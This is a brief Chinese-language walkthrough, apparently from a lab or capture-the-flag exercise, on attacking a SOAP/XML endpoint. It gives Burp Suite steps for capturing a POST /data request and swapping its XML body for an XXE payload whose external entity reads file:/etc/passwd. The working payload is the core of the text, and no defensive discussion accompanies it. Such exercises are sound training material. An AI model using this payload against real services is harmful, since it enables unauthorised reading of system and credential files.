# SOAP

* 開啟Burp Suite
* 打開網頁隨意按下一個按鈕
* 至Proxy->HTTP history
* 找到 [網址] POST /data 隨後右鍵 Send to Repeater
* 將以下
  
```xml
<?xml version="1.0" encoding="UTF-8"?><data><ID>2</ID></data>
```

* 改成

```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY test SYSTEM "file:/etc/passwd">]><data><ID>&test;</ID></data>
```